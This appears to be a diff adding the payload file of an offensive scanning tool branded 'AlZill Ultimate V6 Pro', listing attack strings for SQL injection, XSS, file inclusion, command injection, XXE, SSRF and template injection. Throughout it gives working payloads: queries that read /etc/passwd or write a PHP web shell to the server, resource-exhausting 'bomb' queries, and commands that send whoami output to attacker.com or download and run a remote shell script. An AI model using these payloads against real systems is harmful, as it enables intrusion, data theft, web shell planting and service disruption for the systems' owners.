@@ -1,0 +1,132 @@
+# ============================================================
+# ALZILL ULTIMATE V6 PRO - ZERO-DAY BYPASS PAYLOADS (2026)
+# ============================================================
+# Author: Abu Sari - AlZill Security Team
+# Version: 6.0 Pro - Zero Day Edition
+# Last Updated: 2026
+# Note: Optimized for Smali/Python/Android Security Research
+# ============================================================
+
+[SQLI_TIME]
+1' AND (SELECT COUNT(*) FROM JSON_TABLE('[1,2,3,4,5,6,7,8,9,10]', '$[*]' COLUMNS (value INT PATH '$')) AS jt) AND '1'='1|8
+1' WITH RECURSIVE bomb(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM bomb WHERE n<1000000) SELECT COUNT(*) FROM bomb AND '1'='1|10
+1';WITH XMLNAMESPACES(DEFAULT 'http://tempuri.org/') SELECT COUNT(*) FROM (SELECT CAST(REPLICATE('A',1000000) AS XML)) AS x AND '1'='1--|9
+1' AND (SELECT COUNT(*) OVER (ORDER BY (SELECT 1)) FROM information_schema.tables LIMIT 1000000) AND '1'='1|7
+1' AND (SELECT COUNT(*) FROM unnest(ARRAY(SELECT generate_series(1,500000)))) AND '1'='1|6
+1';DECLARE @c CURSOR;SET @c=CURSOR FOR SELECT TOP 1000000 * FROM sys.objects;OPEN @c;CLOSE @c;DEALLOCATE @c--|8
+1' AND (SELECT COUNT(*) FROM (SELECT @a:=0,(SELECT @a:=@a+1 FROM information_schema.tables LIMIT 500000)) AS tmp) AND '1'='1|7
+1' AND (SELECT COUNT(*) FROM dual CONNECT BY LEVEL<=50000) AND '1'='1|6
+1' WITH RECURSIVE bomb(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM bomb WHERE x<100000) SELECT COUNT(*) FROM bomb AND '1'='1|8
+1' AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AND '1'='1|5
+
+[SQLI_ERROR]
+1' AND JSON_VALID(version()) AND JSON_EXTRACT(version(), '$[invalid]') AND '1'='1-- -
+1' AND numrange(1,5) @> version()::int AND '1'='1-- -
+1' AND OPENJSON('{invalid json}') WITH (ver varchar(100) '$') AND '1'='1-- -
+1' AND ST_GeomFromText(CONCAT('POINT(', version(), ' 0)')) AND '1'='1-- -
+1' AND version()::uuid IS NOT NULL AND '1'='1-- -
+1' AND (SELECT * FROM OPENXML(@x, '/root', 1) WITH (ver varchar(100) '.')) AND '1'='1-- -
+1' AND XMLType('<root>'||version()||'</root>') IS NOT NULL AND '1'='1-- -
+1' AND ST_AsText(ST_GeomFromText(CONCAT('POLYGON((0 0,', version(), ' 0,0 0,0 0))'))) AND '1'='1-- -
+1' AND jsonb_path_query(version()::jsonb, '$.invalid') IS NOT NULL AND '1'='1-- -
+1' AND (SELECT * FROM OPENROWSET(BULK version(), SINGLE_BLOB) AS f) AND '1'='1-- -
+
+[SQLI_BOOLEAN]
+' OR (version() ^ 0xFFFFFFFF) > 0|' OR (version() ^ 0xFFFFFFFF) < 0
+' OR (SELECT hamming_distance(version(), '1.0.0') > 10)|' OR (SELECT hamming_distance(version(), '1.0.0') < 10
+' OR SOUNDEX(version()) = SOUNDEX('8.0')|' OR SOUNDEX(version()) = SOUNDEX('9.0')
+' OR CRC32(version()) = CRC32('5.7')|' OR CRC32(version()) = CRC32('8.0')
+' OR levenshtein(version(), 'PostgreSQL 14') > 10|' OR levenshtein(version(), 'PostgreSQL 14') < 10
+' OR DIFFERENCE(version(), 'SQL Server 2019') > 3|' OR DIFFERENCE(version(), 'SQL Server 2019') < 3
+' OR ROT13(version()) = ROT13('8.0')|' OR ROT13(version()) = ROT13('5.7')
+' OR encode(sha256(version()::bytea), 'hex') = encode(sha256('14'::bytea), 'hex')|' OR encode(sha256(version()::bytea), 'hex') = encode(sha256('13'::bytea), 'hex')
+' OR HASHBYTES('MD5', version()) = HASHBYTES('MD5', '2019')|' OR HASHBYTES('MD5', version()) = HASHBYTES('MD5', '2022')
+' OR WEIGHT_STRING(version()) = WEIGHT_STRING('8.0')|' OR WEIGHT_STRING(version()) = WEIGHT_STRING('5.7')
+
+[SQLI_UNION]
+1' UNION SELECT JSON_ARRAYAGG(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database()-- -
+1' UNION SELECT array_to_string(array_agg(table_name), ','), NULL, NULL FROM information_schema.tables WHERE table_schema='public'-- -
+1' UNION SELECT STUFF((SELECT ',' + table_name FROM information_schema.tables FOR XML PATH('')), 1, 1, ''), NULL, NULL-- -
+1' UNION SELECT CONCAT_WS(0x3a, user(), database(), version()), NULL, NULL-- -
+1' UNION SELECT encode(convert_to(format('%s:%s:%s', user, current_database(), version()), 'UTF8'), 'base64'), NULL, NULL-- -
+1' UNION SELECT STRING_AGG(table_name, ',') FROM information_schema.tables WHERE table_type='BASE TABLE'-- -
+1' UNION SELECT hex(LOAD_FILE('/etc/passwd')), NULL, NULL-- -
+1' UNION SELECT encode(pg_read_file('/etc/passwd'), 'hex'), NULL, NULL-- -
+1' UNION SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS f-- -
+1' UNION SELECT '<?php @eval($_POST[AZILL]);?>' INTO DUMPFILE '/var/www/html/shell.php'-- -
+
+[SQLI_BLIND_HEAVY]
+1' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test')) AND '1'='1
+1' AND (SELECT * FROM dblink('host='||(SELECT version())||'.attacker.com user=test', 'SELECT 1')) AND '1'='1
+1';DECLARE @v VARCHAR(100);SET @v=(SELECT version());EXEC xp_dirtree CONCAT('\\', @v, '.attacker.com\test')-- -
+1' AND (SELECT COUNT(*) FROM mysql.general_log WHERE argument LIKE '%' AND NOW() > '2000-01-01') AND '1'='1
+1' AND (SELECT COUNT(*) FROM pg_largeobject WHERE loid>0 AND NOW() > '2000-01-01') AND '1'='1
+1' AND (SELECT COUNT(*) FROM sys.messages WHERE message_id>0 AND NOW() > '2000-01-01') AND '1'='1
+
+[XSS]
+<svg><![CDATA[<script>alert(1)</script>]]></svg>
+<scr\u0069pt>alert(1)</scr\u0069pt>
+`${eval('al'+'ert(1)')}`
+<div style="--x:expression(alert(1))">X</div>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+<object data="javascript:alert(1)"></object>
+<a href="javascr&#x69;pt:alert(1)">X</a>
+<input type="image" formaction="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+<link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:alert(1)">
+<details ontoggle="alert(1)"><summary>X</summary></details>
+<math><maction actiontype="statusline" href="javascript:alert(1)">X</maction></math>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg><use href="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></use></svg>
+
+[LFI]
+php://filter/convert.quoted-printable-encode|convert.base64-encode|convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/zlib.deflate|string.rot13|convert.base64-encode/resource=index.php
+php://input/<?php system('id'); ?>
+data://text/plain;charset=utf-8;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+expect://$(echo "aWQ=" | base64 -d)
+zip://shell.jpg%23shell.php
+phar://upload.phar/test.txt
+ftp://anonymous:anonymous@attacker.com:21/shell.php
+ssh2.shell://user:pass@attacker.com:22/exec?id
+oci8://user:pass@localhost:1521/XE
+pdo-mysql://localhost:3306/database?charset=utf8
+
+[CMDI]
+python3 -c "exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk='.decode('base64'))"
+perl -e 'system(pack("H*", "6964"))'
+ruby -e 'eval("c3lzdGVtKCdpZCcp".unpack("m")[0])'
+node -e 'eval(Buffer.from("c3lzdGVtKCdpZCcp","base64").toString())'
+php -r 'eval(hex2bin("c3lzdGVtKCdpZCcp"));'
+go run -e 'package main;import"os/exec";func main(){exec.Command("id").Run()}'
+rustc -e 'fn main(){std::process::Command::new("id").status();}' && ./rust_out
+powershell -EncodedCommand SQBkAA==
+{cat,/etc/passwd}
+cat<<<"/etc/passwd"
+${PATH:0:1}${PATH:7:1} ${PATH:0:1}${PATH:8:1}
+nslookup `whoami`.attacker.com
+ping -c 1 `whoami`.attacker.com
+curl http://attacker.com/`whoami`
+wget --post-data=`whoami` http://attacker.com
+
+[CMDi_AUTO_SHELL]
+; (wget http://your-server.com/sh.php -O sh.php || curl -o sh.php http://your-server.com/sh.php) && chmod +x sh.php && php sh.php
+
+[XXE]
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>
+
+[SSRF]
+gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a
+dict://127.0.0.1:11211/stat
+file:///etc/passwd#http://169.254.169.254
+http://127.0.0.1:8080/%0d%0aHost:%20evil.com
+
+[SSTI]
+{{7*7}}
+${7*7}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+@php system('id'); @endphp
+{system('id')}
+
